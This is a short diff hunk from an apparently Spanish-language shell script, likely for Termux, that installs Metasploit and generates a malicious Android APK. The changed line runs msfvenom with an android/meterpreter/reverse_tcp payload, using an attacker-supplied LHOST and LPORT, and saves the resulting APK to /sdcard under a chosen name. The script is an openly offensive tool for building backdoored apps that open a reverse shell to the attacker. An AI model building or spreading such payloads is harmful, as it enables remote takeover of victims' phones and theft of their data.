@@ -91,7 +91,7 @@ pkg install metasploit -y
 	read -p "LPORT:  " port
 	read -p "Nombre (sin .apk):  " name
 	printf "$re"
-./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /sdcard/$name.apk
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /sdcard/$name.apk
 	echo
 	echo
 	printf "$ve [ + ]$am el apk se guardo en la ruta:
